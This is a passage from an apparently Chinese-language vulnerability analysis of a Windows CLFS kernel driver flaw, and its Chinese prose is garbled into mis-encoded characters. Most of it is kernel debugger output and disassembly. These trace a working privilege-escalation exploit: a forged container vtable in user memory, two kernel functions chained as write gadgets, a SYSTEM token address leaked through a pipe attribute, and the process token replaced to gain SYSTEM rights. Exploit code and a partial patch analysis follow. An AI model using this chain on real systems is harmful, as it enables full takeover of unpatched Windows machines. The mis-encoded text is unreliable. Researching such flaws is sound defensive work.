8d a4 ff ff-d6 0f 00 00 00 00 00 00 (..d............ ffffa48d`64eff020 2a f0 ef 64 8d a4 ff ff-5a 00 00 00 00 00 00 00 *..d....Z....... ffffa48d`64eff030 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA å°†ç³»ç»ŸEPROCESSè¿›è¡Œå¼‚æˆ–åå­˜åˆ°æ ˆä¸Šçš„åœ°å€ä¸­\nå°†41414141å†™åˆ°0x100000007çš„å†…å­˜åœ°å€ä¸Š\nè·å–åˆ°SeSetAccessStateGenericMappingå‡½æ•°åœ°å€\n1: kd\u0026gt; u fffff8046b3f2da0 nt!SeSetAccessStateGenericMapping: fffff804`6b3f2da0 488b4148 mov rax,qword ptr [rcx+48h] fffff804`6b3f2da4 0f1002 movups xmm0,xmmword ptr [rdx] fffff804`6b3f2da7 f30f7f4008 movdqu xmmword ptr [rax+8],xmm0 fffff804`6b3f2dac c3 ret fffff804`6b3f2dad cc int 3 fffff804`6b3f2dae cc int 3 fffff804`6b3f2daf cc int 3 fffff804`6b3f2db0 cc int 3 è·å–ClfsEarlierLsnçš„å†…æ ¸åœ°å€\n0: kd\u0026gt; u FFFFF8046A9F1CB0 CLFS!ClfsEarlierLsn: fffff804`6a9f1cb0 488b05c1240000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff804`6a9f4178)] fffff804`6a9f1cb7 4885c9 test rcx,rcx fffff804`6a9f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) fffff804`6a9f1cbc 488b09 mov rcx,qword ptr [rcx] fffff804`6a9f1cbf 483b0d82210000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff804`6a9f3e48)] fffff804`6a9f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) fffff804`6a9f1cc8 483bc8 cmp rcx,rax fffff804`6a9f1ccb 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) æŠŠä¸¤ä¸ªå‡½æ•°å¸ƒå±€åˆ°0x500008å’Œ0x500018ä¸Š\nè§¦å‘æ¼æ´pContaineræŒ‡é’ˆé«˜5ä½è¢«æ¸…é›¶ï¼ŒæŒ‡é’ˆæŒ‡å‘0x593a0ï¼Œè¯¥åœ°å€ä¸ºç”¨æˆ·å±‚å†…å­˜åœ°å€ã€‚\n1: kd\u0026gt; db rax ffffbc0b`276dd070 06 00 00 00 00 00 00 00-69 be 23 a9 92 15 ee 11 ........i.#..... ffffbc0b`276dd080 bc 80 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffffbc0b`276dd090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0a0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbc0b`276dd0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0c0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax -0x11000 ffffbc0b`276cc070 01 00 00 00 00 00 00 00-2b 21 72 e4 7f 15 ee 11 ........+!r..... ffffbc0b`276cc080 bc 7f 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffffbc0b`276cc090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0c0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbc0b`276cc0d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax + 0x1468 ffffbc0b`276de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffbc0b`276de4e8 00 00 00 00 00 00 00 00-a0 93 50 00 00 00 00 00 ..........P..... ffffbc0b`276de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ è·å–pContaineræŒ‡é’ˆï¼Œå¹¶å°è¯•è§£å¼•ç”¨pContainerè·å–åˆ°CClfsContainerå¯¹è±¡ï¼Œè€Œåè°ƒç”¨å¯¹è±¡çš„æŒ‡é’ˆ\nfffff800`11306ebf 498b7f18 mov rdi, qword ptr [r15+18h] fffff800`11306ec3 4885ff test rdi, rdi fffff800`11306ec6 0f84b9000000 je CLFS!CClfsBaseFilePersisted::RemoveContainer+0x1d5 (fffff80011306f85) fffff800`11306ecc 4983671800 and qword ptr [r15+18h], 0 fffff800`11306ed1 65488b142588010000 mov rdx, qword ptr gs:[188h] fffff800`11306eda 488b4e20 mov rcx, qword ptr [rsi+20h] fffff800`11306ede 4c8b15c3d1ffff mov r10, qword ptr [CLFS!__imp_ExReleaseResourceForThreadLite (fffff800113040a8)] fffff800`11306ee5 e8a655c203 call ntkrnlmp!ExReleaseResourceForThreadLite (fffff80014f2c490) fffff800`11306eea 4532f6 xor r14b, r14b fffff800`11306eed 4488742420 mov byte ptr [rsp+20h], r14b fffff800`11306ef2 488b07 mov rax, qword ptr [rdi] fffff800`11306ef5 488b4018 mov rax, qword ptr [rax+18h] fffff800`11306ef9 488bcf mov rcx, rdi fffff800`11306efc ff15ced6ffff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800113045d0)] fffff800`11306f02 488b07 mov rax, qword ptr [rdi] fffff800`11306f05 488b4008 mov rax, qword ptr [rax+8] fffff800`11306f09 488bcf mov rcx, rdi fffff800`11306f0c ff15bed6ffff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800113045d0)] 1: kd\u0026gt; db r15 ffffbc0b`276de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffbc0b`276de4e8 00 00 00 00 00 00 00 00-a0 93 50 00 00 00 00 00 ..........P..... ffffbc0b`276de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::RemoveContainer+0x113: fffff800`11306ec3 4885ff test rdi,rdi 1: kd\u0026gt; rrdi rdi=00000000005093a0 1: kd\u0026gt; dp rdi 00000000`005093a0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093b0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093c0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093d0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093e0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093f0 00000000`05000000 ffffbc0b`24f9c018 00000000`00509400 00000000`05000000 ffffbc0b`24f9c018 00000000`00509410 00000000`05000000 ffffbc0b`24f9c018 1: kd\u0026gt; dq 00000000`05000000 00000000`05000000 00000001`23456789 fffff800`151f2da0 00000000`05000010 00000000`00000000 fffff800`112f1cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 è¯¥å¯¹è±¡å·²ç»è¢«ç”¨æˆ·å±‚æ§åˆ¶ï¼ŒCClfsContainerçš„vftableè¢«æŒ‡å‘05000000\nåœ¨05000000+0x8å’Œ05000000+0x18å¤„çš„ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆåˆ†åˆ«æ˜¯SeSetAccessStateGenericMappingå’ŒClfsEarlierLsn\n1: kd\u0026gt; dq 00000000`05000000 00000000`05000000 00000001`23456789 fffff800`151f2da0 00000000`05000010 00000000`00000000 fffff800`112f1cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 1: kd\u0026gt; u fffff800`151f2da0 nt!SeSetAccessStateGenericMapping: fffff800`151f2da0 488b4148 mov rax,qword ptr [rcx+48h] fffff800`151f2da4 0f1002 movups xmm0,xmmword ptr [rdx] fffff800`151f2da7 f30f7f4008 movdqu xmmword ptr [rax+8],xmm0 fffff800`151f2dac c3 ret fffff800`151f2dad cc int 3 fffff800`151f2dae cc int 3 fffff800`151f2daf cc int 3 fffff800`151f2db0 cc int 3 1: kd\u0026gt; u fffff800`112f1cb0 CLFS!ClfsEarlierLsn: fffff800`112f1cb0 488b05c1240000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`112f4178)] fffff800`112f1cb7 4885c9 test rcx,rcx fffff800`112f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`112f1cf2) fffff800`112f1cbc 488b09 mov rcx,qword ptr [rcx] fffff800`112f1cbf 483b0d82210000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`112f3e48)] fffff800`112f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`112f1cf2) å†…æ ¸å°†ä¾æ¬¡è°ƒç”¨ClfsEarlierLsnå’ŒSeSetAccessStateGenericMapping\nåœ¨ClfsEarlierLsnä¸­edxè¢«è®¾ä¸º0xFFFFFFFF\nCLFS!ClfsEarlierLsn: fffff800`112f1cb0 488b05c1240000 mov rax, qword ptr [CLFS!CLFS_LSN_INVALID (fffff800112f4178)] fffff800`112f1cb7 4885c9 test rcx, rcx fffff800`112f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1cbc 488b09 mov rcx, qword ptr [rcx] fffff800`112f1cbf 483b0d82210000 cmp rcx, qword ptr [CLFS!CLFS_LSN_NULL (fffff800112f3e48)] fffff800`112f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1cc8 483bc8 cmp rcx, rax fffff800`112f1ccb 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1ccd 83caff or edx, 0FFFFFFFFh fffff800`112f1cd0 48894c2408 mov qword ptr [rsp+8], rcx fffff800`112f1cd5 03ca add ecx, edx fffff800`112f1cd7 894c2408 mov dword ptr [rsp+8], ecx fffff800`112f1cdb 3bca cmp ecx, edx fffff800`112f1cdd 750e jne CLFS!ClfsEarlierLsn+0x3d (fffff800112f1ced) fffff800`112f1cdf 8b4c240c mov ecx, dword ptr [rsp+0Ch] fffff800`112f1ce3 85c9 test ecx, ecx fffff800`112f1ce5 740b je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1ce7 03ca add ecx, edx fffff800`112f1ce9 894c240c mov dword ptr [rsp+0Ch], ecx fffff800`112f1ced 488b442408 mov rax, qword ptr [rsp+8] fffff800`112f1cf2 c3 ret 1: kd\u0026gt; redx edx=ffffffff 1: kd\u0026gt; u CLFS!ClfsEarlierLsn+0x42: fffff800`112f1cf2 c3 ret fffff800`112f1cf3 cc int 3 fffff800`112f1cf4 cc int 3 fffff800`112f1cf5 cc int 3 fffff800`112f1cf6 cc int 3 fffff800`112f1cf7 cc int 3 fffff800`112f1cf8 cc int 3 fffff800`112f1cf9 cc int 3 åœ¨SeSetAccessStateGenericMappingå‡½æ•°ä¸­ï¼Œå°†rdxå­˜å‚¨çš„æŒ‡é’ˆå¤åˆ¶åˆ°rcx+48å­˜å‚¨çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸­ï¼Œå‰é¢è°ƒç”¨ClfsEarlierLsnä¹‹åï¼ŒrdxæŒ‡å‘0xFFFFFFFF\nnt!SeSetAccessStateGenericMapping: fffff800`151f2da0 488b4148 mov rax, qword ptr [rcx+48h] fffff800`151f2da4 0f1002 movups xmm0, xmmword ptr [rdx] fffff800`151f2da7 f30f7f4008 movdqu xmmword ptr [rax+8], xmm0 fffff800`151f2dac c3 ret åœ¨å†…å­˜0xFFFFFFFFå·²ç»å­˜å‚¨äº†ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†system token\n1: kd\u0026gt; dq rdx 00000000`ffffffff ffffa48f`4149e000 41414141`4141005a 00000001`0000000f 00000000`00000000 00000000`00000000 00000001`0000001f 00000000`00000000 00000000`00000000 00000001`0000002f 00000000`00000000 00000000`00000000 00000001`0000003f 00000000`00000000 00000000`00000000 00000001`0000004f 00000000`00000000 00000000`00000000 00000001`0000005f 00000000`00000000 00000000`00000000 00000001`0000006f 00000000`00000000 00000000`00000000 v14 = system_EPROCESS \u0026amp; 0xfff; v15 = system_EPROCESS \u0026amp; 0xfffffffffffff000; dest2 = 0xffffffff; dest3 = 0x100000007; value2 = 0x414141414141005A; value3 = 0; value3 = \u0026amp;value2; // åœ¨0xffffffffåœ°å€åˆ†é…0x100000å¤§å°çš„å†…å­˜ if (VirtualAlloc((LPVOID)dest2, 0x100000, 0x3000, 4)) { memset((LPVOID)dest3, 0, 0xff8); // å†™å…¥system_EPROCESS \u0026amp; 0xfffffffffffff000; *(UINT64*)dest2 = v15; è€Œrcx+48å­˜å‚¨äº†pipeçš„AttributeValueSizeçš„åœ°å€\n1: kd\u0026gt; db rcx+0x48 00000000`005093e8 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`005093f8 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509408 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509418 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509428 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509438 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509448 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509458 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ ç»§ç»­æ‰§è¡Œï¼Œå°†ä¼šæŠŠ0xFFFFFFFFå­˜å‚¨çš„æŒ‡é’ˆå†™å…¥åˆ°rax+8çš„åœ°å€ä¸Šï¼Œå†…æ ¸ä¸­pipeå¯¹è±¡çš„AttributeValue å€¼å·²ç»è¢«è¦†ç›–ä¸ºsystem tokenåœ°å€\n1: kd\u0026gt; nt!SeSetAccessStateGenericMapping+0xc: fffff800`151f2dac c3 ret 1: kd\u0026gt; db rax-0x18 ffffbc0b`24f9c000 b0 32 0e 27 0b bc ff ff-b0 32 0e 27 0b bc ff ff .2.\u0026#39;.....2.\u0026#39;.... ffffbc0b`24f9c010 28 c0 f9 24 0b bc ff ff-d6 0f 00 00 00 00 00 00 (..$............ ffffbc0b`24f9c020 **00 e0 49 41 8f a4 ff** ff-5a 00 41 41 41 41 41 41 ..IA....Z.AAAAAA ffffbc0b`24f9c030 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ä¹‹åé€šè¿‡_NtFsControlFileå¹¶è®¾ControlCodeä¸º0x110038ï¼Œåˆ™ä¼šè¯»å–pipeå¯¹è±¡çš„AttributeValueå¹¶å†™å…¥åˆ°ç”¨æˆ·æä¾›çš„ç¼“å†²åŒºä¸­ï¼Œè¯»å–åˆ°è¿™é‡Œå·²ç»è¯»å–åˆ°äº†system tokençš„åœ°å€ã€‚\nä¸ºäº†å®Œæˆtokenæ›¿æ¢ï¼Œexpç¬¬äºŒæ¬¡è§¦å‘æ¼æ´ï¼Œåœ¨è§¦å‘ä¹‹å‰å †å†…å­˜è¿›è¡Œå¸ƒå±€ã€‚æŠŠsystem tokenåœ°å€å¸ƒå±€åˆ°0xFFFFFFFFï¼Œä»0x10008å¼€å§‹æ¯éš”0x10æŠŠè‡ªèº«tokenåœ°å€å†™å…¥åˆ°è¯¥åœ°å€ä¸­\nè§¦å‘æ¼æ´ï¼ˆè¿™é‡Œé‡æ–°è°ƒè¯•äº†ï¼Œæ‰€ä»¥åœ°å€ä¸ä¸€æ ·ï¼‰ï¼Œåœ¨CLFS!CClfsBaseFilePersisted::RemoveContainerä¸­æ–­ä¸‹\n1: kd\u0026gt; g Breakpoint 1 hit CLFS!CClfsBaseFilePersisted::RemoveContainer+0x48: fffff807`13a66df8 488bf8 mov rdi,rax 0: kd\u0026gt; db rax ffff8e86`0c0dd070 06 00 00 00 00 00 00 00-c6 6c 11 93 9c 15 ee 11 .........l...... ffff8e86`0c0dd080 bc 82 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffff8e86`0c0dd090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0c0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0d0 38 13 00 00 00 00 00 00-00 00 00 00 00 00 00 00 8............... ffff8e86`0c0dd0e0 00 00 00 00 00 00 00 00-38 14 00 00 00 00 00 00 ........8....... 0: kd\u0026gt; db rax + 0x1468 ffff8e86`0c0de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffff8e86`0c0de4e8 00 00 00 00 00 00 00 00-10 38 bb 00 00 00 00 00 .........8...... ffff8e86`0c0de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ æŸ¥çœ‹æ­¤æ—¶çš„pContainerå¯¹è±¡\n0: kd\u0026gt; db bb3810 00000000`00bb3810 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3820 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3830 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3840 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3850 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3860 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3870 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3880 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... vtable\n0: kd\u0026gt; dq 5000000 00000000`05000000 00000001`23456789 fffff807`15ff2da0 00000000`05000010 00000000`00000000 fffff807`13a51cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 æ‰§è¡Œåˆ°nt!SeSetAccessStateGenericMappingå‡½æ•°æ—¶ï¼ŒrdxæŒ‡å‘å†…å­˜0xFFFFFFFFï¼Œè¯¥å†…å­˜å­˜å‚¨äº†system tokençš„åœ°å€ï¼Œå°†å…¶å†™å…¥åˆ°rax+8æŒ‡å‘çš„åœ°å€ä¸­ï¼Œæ­¤å¤„ä¸ºè‡ªèº«tokenåœ°å€ï¼Œä¹Ÿå°±æ˜¯å°†system tokenåœ°å€å†™å…¥åˆ°äº†è‡ªèº«tokenåœ°å€ä¸­ï¼Œå³æŠŠè‡ªèº«token æ›¿æ¢æˆäº†system tokenè¾¾æˆææƒã€‚\nsystemæƒé™token 1: kd\u0026gt; dp rdx L6 00000000`ffffffff ffff8e86`03e616fc 00000000`00000000 00000001`0000000f 00000000`00000000 00000000`00000000 00000001`0000001f 00000000`00000000 00000000`00000000 1: kd\u0026gt; !process 4 1 Searching for Process with Cid == 4 PROCESS ffffb1838ce87180 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 001ad000 ObjectTable: ffff8e8603e57d40 HandleCount: 2731. Image: System VadRoot ffffb1838ce94920 Vads 6 Clone 0 Private 22. Modified 4650. Locked 0. DeviceMap ffff8e8603e35ae0 Token ffff8e8603e616f0 ElapsedTime 00:58:07.536 UserTime 00:00:00.000 KernelTime 00:00:03.093 QuotaPoolUsage[PagedPool] 0 QuotaPoolUsage[NonPagedPool] 272 Working Set Sizes (now,min,max) (49, 50, 450) (196KB, 200KB, 1800KB) PeakWorkingSetSize 216 VirtualSize 3 Mb PeakVirtualSize 14 Mb PageFaultCount 2325 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 49 å½“å‰æƒé™token 1: kd\u0026gt; !process 0x10cc 1 Searching for Process with Cid == 10cc PROCESS ffffb18391fe7080 SessionId: 1 Cid: 10cc Peb: f894963000 ParentCid: 0294 DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount: 92. Image: exp.exe VadRoot ffffb18392993580 Vads 57 Clone 0 Private 4686. Modified 1209. Locked 0. DeviceMap ffff8e8608a9b1d0 Token ffff8e860bc6f770 ElapsedTime 00:54:10.168 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 123368 QuotaPoolUsage[NonPagedPool] 8096 Working Set Sizes (now,min,max) (5602, 50, 345) (22408KB, 200KB, 1380KB) PeakWorkingSetSize 5529 VirtualSize 4210 Mb PeakVirtualSize 4210 Mb PageFaultCount 8565 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 6285 1: kd\u0026gt; dp rax+8 L2 ffffb183`91fe7538 ffff8e86`0bc6f774 00000000`00000000 ç»§ç»­æ‰§è¡Œï¼Œå½“å‰è¿›ç¨‹çš„Tokenå·²ç»è¢«æ›¿æ¢ä¸ºç³»ç»ŸToken\n1: kd\u0026gt; nt!SeSetAccessStateGenericMapping+0xc: fffff807`15ff2dac c3 ret 1: kd\u0026gt; dp ffffb183`91fe7080+0x4b8 L6 ffffb183`91fe7538 ffff8e86`03e616fc 00000000`00000000 ffffb183`91fe7548 00000000`00000000 00000000`00000000 ffffb183`91fe7558 00000000`00000000 00000000`00000000 1: kd\u0026gt; !process 0x10cc 1 Searching for Process with Cid == 10cc PROCESS ffffb18391fe7080 SessionId: 1 Cid: 10cc Peb: f894963000 ParentCid: 0294 DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount: 92. Image: exp.exe VadRoot ffffb18392993580 Vads 57 Clone 0 Private 4686. Modified 1209. Locked 0. DeviceMap ffff8e8608a9b1d0 Token ffff8e8603e616f0 ElapsedTime 01:06:41.537 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 123368 QuotaPoolUsage[NonPagedPool] 8096 Working Set Sizes (now,min,max) (5602, 50, 345) (22408KB, 200KB, 1380KB) PeakWorkingSetSize 5529 VirtualSize 4210 Mb PeakVirtualSize 4210 Mb PageFaultCount 8565 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 6285 1: kd\u0026gt; !token ffff8e8603e616f0 _TOKEN 0xffff8e8603e616f0 TS Session ID: 0 User: S-1-5-18 User Groups: 00 S-1-5-32-544 Attributes - Default Enabled Owner 01 S-1-1-0 Attributes - Mandatory Default Enabled 02 S-1-5-11 Attributes - Mandatory Default Enabled 03 S-1-16-16384 Attributes - GroupIntegrity GroupIntegrityEnabled Primary Group: S-1-5-18 Privs: 02 0x000000002 SeCreateTokenPrivilege Attributes - 03 0x000000003 SeAssignPrimaryTokenPrivilege Attributes - 04 0x000000004 SeLockMemoryPrivilege Attributes - Enabled Default 05 0x000000005 SeIncreaseQuotaPrivilege Attributes - 07 0x000000007 SeTcbPrivilege Attributes - Enabled Default 08 0x000000008 SeSecurityPrivilege Attributes - 09 0x000000009 SeTakeOwnershipPrivilege Attributes - 10 0x00000000a SeLoadDriverPrivilege Attributes - 11 0x00000000b SeSystemProfilePrivilege Attributes - Enabled Default 12 0x00000000c SeSystemtimePrivilege Attributes - 13 0x00000000d SeProfileSingleProcessPrivilege Attributes - Enabled Default 14 0x00000000e SeIncreaseBasePriorityPrivilege Attributes - Enabled Default 15 0x00000000f SeCreatePagefilePrivilege Attributes - Enabled Default 16 0x000000010 SeCreatePermanentPrivilege Attributes - Enabled Default 17 0x000000011 SeBackupPrivilege Attributes - 18 0x000000012 SeRestorePrivilege Attributes - 19 0x000000013 SeShutdownPrivilege Attributes - 20 0x000000014 SeDebugPrivilege Attributes - Enabled Default 21 0x000000015 SeAuditPrivilege Attributes - Enabled Default 22 0x000000016 SeSystemEnvironmentPrivilege Attributes - 23 0x000000017 SeChangeNotifyPrivilege Attributes - Enabled Default 25 0x000000019 SeUndockPrivilege Attributes - 28 0x00000001c SeManageVolumePrivilege Attributes - 29 0x00000001d SeImpersonatePrivilege Attributes - Enabled Default 30 0x00000001e SeCreateGlobalPrivilege Attributes - Enabled Default 31 0x00000001f SeTrustedCredManAccessPrivilege Attributes - 32 0x000000020 SeRelabelPrivilege Attributes - 33 0x000000021 SeIncreaseWorkingSetPrivilege Attributes - Enabled Default 34 0x000000022 SeTimeZonePrivilege Attributes - Enabled Default 35 0x000000023 SeCreateSymbolicLinkPrivilege Attributes - Enabled Default 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege Attributes - Enabled Default Authentication ID: (0,3e7) Impersonation Level: Anonymous TokenType: Primary Source: *SYSTEM* TokenFlags: 0x2000 ( Token in use ) Token ID: 3eb ParentToken ID: 0 Modified ID: (0, 3ec) RestrictedSidCount: 0 RestrictedSids: 0x0000000000000000 OriginatingLogonSession: 0 PackageSid: (null) CapabilityCount: 0 Capabilities: 0x0000000000000000 LowboxNumberEntry: 0x0000000000000000 Security Attributes: Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims Process Token TrustLevelSid: S-1-19-1024-8192 æ›¿æ¢å®ŒTokenä¹‹åå½“å‰è¿›ç¨‹æƒé™å·²ç»å˜ä¸ºsystemæƒé™\nè¡¥ä¸åˆ†æ WIN10\nä½¿ç”¨BindiffæŸ¥çœ‹å¯çŸ¥è¡¥ä¸ä¸»è¦ä¿®æ”¹äº†ä¸‰ä¸ªå‡½æ•°\nåœ¨CClfsBaseFilePersisted::LoadContainerQå¢åŠ äº†å¯¹SignatureOffsetçš„æ£€æŸ¥ï¼Œä½¿å…¶ä¸èƒ½è¶…è¿‡BASE_RECORDå¤§å°ï¼Œå¢åŠ äº†å¯¹cbSymbolZone çš„æ£€æŸ¥\n__int64 __fastcall CClfsBaseFilePersisted::LoadContainerQ( CClfsBaseFilePersisted *this, unsigned int *const a2, int a3, unsigned __int8 a4, char a5, union _CLS_LSN a6, unsigned int *a7, unsigned int *a8, unsigned __int64 *a9) { ..... while ( v16 ); v74 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); BaseLogRecord = (struct _CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); if ( BaseLogRecord ) { if ( 